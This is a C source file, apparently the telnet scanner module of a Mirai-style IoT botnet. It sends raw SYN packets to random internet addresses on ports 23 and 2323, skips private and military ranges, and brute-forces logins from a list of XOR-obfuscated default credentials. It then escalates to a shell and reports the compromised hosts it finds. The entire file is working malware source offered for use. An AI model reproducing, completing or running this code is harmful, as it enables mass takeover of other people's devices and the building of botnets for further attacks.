#define _GNU_SOURCE

#ifdef WICKED_SCANNER

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "includes.h"
#include "scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"
#include "resolv.h"

int scanner_pid, rsck, rsck_out, auth_table_len = 0;
char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
struct scanner_auth *auth_table = NULL;
struct scanner_connection *conn_table;
uint16_t auth_table_max_weight = 0;
uint32_t fake_time = 0;

int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if (ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

void scanner_init(void)
{
    int i;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    fake_time = time(NULL);
    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to initialize raw socket, cannot scan\n");
#endif
        exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
#ifdef DEBUG
        printf("[scanner] Failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while (ntohs(source_port) < 1024);

    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;
	
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x56\x53\x5A\x5E\x59", 1); // admin admin
    add_auth_entry("\x45\x58\x58\x43", "\x56\x53\x5A\x5E\x59", 9); // root admin
    add_auth_entry("\x42\x55\x59\x43", "\x42\x55\x59\x43", 1); // ubnt ubnt
    add_auth_entry("\x44\x52\x45\x41\x5E\x54\x52", "\x5E\x47\x53\x58\x59\x50\x5B\x52", 6); // service ipdongle
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x5B\x7D\x40\x47\x55\x58\x01", 8); // default lJwpbo6
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x64\x05\x51\x70\x46\x79\x71\x44", 8); // default S2fGqNFs
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x78\x4F\x5F\x5B\x40\x64\x70\x0F", 8); // default OxhlwSG8
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x53\x52\x51\x56\x42\x5B\x43", 7); // default default
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x47\x56\x44\x44\x40\x58\x45\x53", 1); // admin password
    add_auth_entry("\x45\x58\x58\x43", "\x02\x42\x47", 3); // root 5up
    add_auth_entry("\x45\x58\x58\x43", "\x4D\x5B\x4F\x4F\x19", 1); // root zlxx.
    add_auth_entry("\x45\x58\x58\x43", "\x41\x5E\x4D\x4F\x41", 5); // root vizxv
	add_auth_entry("\x45\x58\x58\x43", "\x6D\x43\x52\x02\x05\x06", 1); // root Zte521
	add_auth_entry("\x45\x58\x58\x43", "\x56\x59\x5C\x58", 5); // root anko
    add_auth_entry("\x42\x44\x52\x45", "\x42\x44\x52\x45", 1); // user user
    add_auth_entry("\x50\x42\x52\x44\x43", "\x50\x42\x52\x44\x43", 1); // guest guest
    add_auth_entry("\x50\x42\x52\x44\x43", "\x06\x05\x04\x03\x02", 1); // guest 12345
    add_auth_entry("\x45\x58\x58\x43", "\x06\x05\x04\x03\x02\x01", 1); // root 123456
    add_auth_entry("\x45\x58\x58\x43", "\x47\x56\x44\x44\x40\x58\x45\x53", 1); // root password
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x06\x05\x04\x03", 1); // admin 1234
	add_auth_entry("\x53\x56\x52\x5A\x58\x59", "\x53\x56\x52\x5A\x58\x59", 8); // daemon daemon
    add_auth_entry("\x56\x53\x5A", "", 6); // adm
    add_auth_entry("\x55\x5E\x59", "", 6); // bin
	add_auth_entry("\x53\x56\x52\x5A\x58\x59", "", 7); // daemon
	add_auth_entry("\x45\x58\x58\x43", "", 1); // root
	add_auth_entry("\x56\x53\x5A\x5E\x59", "", 1); // admin
	add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "", 6); // default
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x53\x41\x45\x05\x02\x0F\x07\x05\x05\x05", 1); // admin dvr2580222
    add_auth_entry("\x45\x58\x58\x43", "\x5E\x47\x54\x56\x5A\x68\x45\x43\x02\x04\x02\x07", 5); // root ipcam_rt5350
    add_auth_entry("\x45\x58\x58\x43", "\x4F\x5A\x5F\x53\x5E\x47\x54", 1); // root xmhdipc
    add_auth_entry("\x45\x58\x58\x43", "\x53\x52\x51\x56\x42\x5B\x43", 1); // root default
    add_auth_entry("\x45\x58\x58\x43", "\x5D\x42\x56\x59\x43\x52\x54\x5F", 1); // root juantech
    add_auth_entry("\x45\x58\x58\x43", "\x02\x03\x04\x05\x06", 1); // root 54321
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x56\x53\x5A\x5E\x59\x06\x05\x04\x03", 1); // admin admin1234
	add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x56\x59\x43\x44\x5B\x46", 1); // default antslq
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x54\x5F\x56\x59\x50\x52\x5A\x52", 1); // admin changeme
	add_auth_entry("\x45\x58\x58\x43", "\x54\x5F\x56\x59\x50\x52\x5A\x52", 1); // root changeme
	add_auth_entry("\x42\x44\x52\x45", "\x42\x44\x52\x45", 1); // user user
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x06\x05\x04\x03\x02\x01", 1); // admin 123456
	add_auth_entry("\x50\x42\x52\x44\x43", "\x06\x05\x04\x03\x02\x01", 1); // guest 123456
    add_auth_entry("\x45\x58\x58\x43", "\x53\x52\x51\x56\x42\x5B\x43", 1); // root default
	add_auth_entry("\x45\x58\x58\x43", "\x0F\x0F\x0F\x0F\x0F\x0F", 1); // root 888888
	add_auth_entry("\x45\x58\x58\x43", "\x06\x05\x04\x03\x02\x01\x00\x0F\x0E\x07", 1); // root 1234567890
	add_auth_entry("\x45\x58\x58\x43", "\x00\x42\x5D\x7A\x5C\x58\x07\x41\x5E\x4D\x4F\x41", 1); // root 7ujMko0vizxv 
	add_auth_entry("\x45\x58\x58\x43", "\x70\x7A\x0F\x06\x0F\x05", 1); // root GM8182
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x06\x05\x04\x03\x02\x01\x00\x0F\x0E\x07", 1); // admin 1234567890
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x76\x73\x7A\x7E\x79", 1); // admin ADMIN
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x56\x53\x5A\x5E\x59\x5E\x44\x43\x45\x56\x43\x58\x45", 1); // admin administrator
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x45\x56\x53\x5E\x42\x44", 1); // admin radius
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x56\x53\x5A\x5E\x59\x06\x05\x04", 1); // admin admin123
	add_auth_entry("\x45\x58\x58\x43", "\x45\x58\x58\x43\x06\x05\x04", 1); // root root123
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x00\x42\x5D\x7A\x5C\x58\x07\x56\x53\x5A\x5E\x59", 1); // admin 7ujMko0admin
	add_auth_entry("\x41\x44\x43\x56\x45\x54\x56\x5A\x05\x07\x06\x00", "\x05\x07\x06\x00\x07\x0E\x06\x05", 4); // vstarcam2017:20170912
	add_auth_entry("\x45\x58\x58\x43", "\x06\x05\x04\x03\x02", 1); // root 12345
	add_auth_entry("\x45\x58\x58\x43", "\x56\x59\x59\x5E\x52\x05\x07\x06\x02", 1); // root annie2015
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x41\x52\x45\x43\x52\x4F\x05\x02\x52\x5C\x43\x5C\x44\x06\x05\x04", 1); // admin vertex25ektks123
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x06\x0E\x0F\x0F", 1); // admin 1988
	add_auth_entry("\x45\x58\x58\x43", "\x06\x07\x07\x06\x54\x5F\x5E\x59", 2); // root 1001chin
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x02\x03\x04\x05\x06", 1); // admin 54321
	add_auth_entry("\x44\x5F\x52\x5B\x5B", "\x44\x5F", 1); // shell sh
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x54\x58\x5A\x54\x58\x5A\x54\x58\x5A", 1); // admin comcomcom
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x62\x46\x1A\x03\x70\x7E\x43\x04\x7A", 1); // admin Uq-4GIt3M
	add_auth_entry("\x56\x53\x5A\x5E\x59", "\x4F\x56\x53\x14\x06\x05", 1); // admin xad#12

	
#ifdef DEBUG
    printf("[scanner] Scanner process initialized. Scanning started.\n");
#endif

    // Main logic loop
    while (TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if (fake_time != last_spew)
        {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

                if (i % 10 == 0)
                {
                    tcph->dest = htons(2323);
                }
                else
                {
                    tcph->dest = htons(23);
                }
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (TRUE)
        {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_connection *conn;

            errno = 0;
            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != htons(23) && tcph->source != htons(2323))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if (conn_table[n].state == SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if (conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
#ifdef DEBUG
            printf("[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
        }

        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            int timeout;

            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
#ifdef DEBUG
                printf("[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;

                // Retry
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    if (++(conn->tries) == 40)
                    {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else
                    {
                        setup_connection(conn);
#ifdef DEBUG
                        printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                    }
                }
                else
                {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
                    conn->state = SC_HANDLE_IACS;
                    conn->auth = random_auth_entry();
                    conn->rdbuf_pos = 0;
#ifdef DEBUG
                    printf("[scanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
#endif
                }
                else
                {
#ifdef DEBUG
                    printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (TRUE)
                {
                    int ret;

                    if (conn->state == SC_CLOSED)
                        break;

                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret == 0)
                    {
#ifdef DEBUG
                        printf("[scanner] FD%d connection gracefully closed\n", conn->fd);
#endif
                        errno = ECONNRESET;
                        ret = -1; // Fall through to closing connection below
                    }
                    if (ret == -1)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
#ifdef DEBUG
                            printf("[scanner] FD%d lost connection\n", conn->fd);
#endif
                            close(conn->fd);
                            conn->fd = -1;

                            // Retry
                            if (++(conn->tries) >= 40)

                            {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                            else
                            {
                                setup_connection(conn);
#ifdef DEBUG
                                printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                            }
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;

                    while (TRUE)
                    {
                        int consumed = 0;

                        switch (conn->state)
                        {
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)
                            {
                                conn->state = SC_WAITING_USERNAME;
#ifdef DEBUG
                                printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_USERNAME:
                            if ((consumed = consume_user_prompt(conn)) > 0)
                            {
                                send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWORD;
#ifdef DEBUG
                                printf("[scanner] FD%d received username prompt\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_PASSWORD:
                            if ((consumed = consume_pass_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received password prompt\n", conn->fd);
#endif

                                // Send password
                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;
                        case SC_WAITING_PASSWD_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received shell prompt\n", conn->fd);
#endif

                                // Send enable / system / shell / sh to session to drop into shell if needed
                                table_unlock_val(TABLE_SCAN_ENABLE);
                                tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_ENABLE);
                                conn->state = SC_WAITING_ENABLE_RESP;
                            }
                            break;
                        case SC_WAITING_ENABLE_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SYSTEM);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SYSTEM, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SYSTEM);

                                conn->state = SC_WAITING_SYSTEM_RESP;
                            }
                            break;
			case SC_WAITING_SYSTEM_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SHELL);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SHELL);

                                conn->state = SC_WAITING_SHELL_RESP;
                            }
                            break;
                        case SC_WAITING_SHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received enable prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SH);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SH, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SH);

                                conn->state = SC_WAITING_SH_RESP;
                            }
                            break;
                        case SC_WAITING_SH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                // Send query string
                                table_unlock_val(TABLE_SCAN_QUERY);
                                tmp_str = table_retrieve_val(TABLE_SCAN_QUERY, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_QUERY);

                                conn->state = SC_WAITING_TOKEN_RESP;
                            }
                            break;
                        case SC_WAITING_TOKEN_RESP:
                            consumed = consume_resp_prompt(conn);
                            if (consumed == -1)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d invalid username/password combo\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;

                                // Retry
								if (++(conn->tries) >= 40)
                                {
                                    conn->tries = 0;
                                    conn->state = SC_CLOSED;
                                }
                                else
                                {
                                    setup_connection(conn);
#ifdef DEBUG
                                    printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                                }
                            }
                            else if (consumed > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
#ifdef DEBUG
                                printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
#endif
                                report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = SC_CLOSED;
                            }
                            break;
                        default:
                            consumed = 0;
                            break;
                        }

                        // If no data was consumed, move on
                        if (consumed == 0)
                            break;
                        else
                        {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;

                            conn->rdbuf_pos -= consumed;
                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                        }
                    }
                }
            }
        }
    }
}

void scanner_kill(void)
{
    kill(scanner_pid, 9);
}

static void setup_connection(struct scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to call socket()\n");
#endif
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}

static ipv4_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(o1,o2,o3,o4);
}

static int consume_iacs(struct scanner_connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static int consume_any_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_user_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp, len;
		char *ogin, *enter;
		
        table_unlock_val(TABLE_SCAN_OGIN);
		table_unlock_val(TABLE_SCAN_ENTER);
		
		ogin = table_retrieve_val(TABLE_SCAN_OGIN, &len);
		enter = table_retrieve_val(TABLE_SCAN_ENTER, &len);
		
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, ogin, len - 1) != -1))
            prompt_ending = tmp;
		
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, enter, len - 1) != -1))
            prompt_ending = tmp;
		
    }
        table_lock_val(TABLE_SCAN_OGIN);
		table_lock_val(TABLE_SCAN_ENTER);
		
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_pass_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
		int tmp, len;
		char *assword;
		
		table_unlock_val(TABLE_SCAN_ASSWORD);
		
		assword = table_retrieve_val(TABLE_SCAN_ASSWORD, &len);
		
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, assword, len - 1) != -1))
            prompt_ending = tmp;
    }
		table_lock_val(TABLE_SCAN_ASSWORD);
		
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_resp_prompt(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    table_unlock_val(TABLE_SCAN_NCORRECT);
    tkn_resp = table_retrieve_val(TABLE_SCAN_NCORRECT, &len);
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1) != -1)
    {
        table_lock_val(TABLE_SCAN_NCORRECT);
        return -1;
    }
    table_lock_val(TABLE_SCAN_NCORRECT);

    table_unlock_val(TABLE_SCAN_RESP);
    tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);
    table_lock_val(TABLE_SCAN_RESP);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
{
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}

static struct scanner_auth *random_auth_entry(void)
{
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);

    for (i = 0; i < auth_table_len; i++)
    {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }

    return NULL;
}

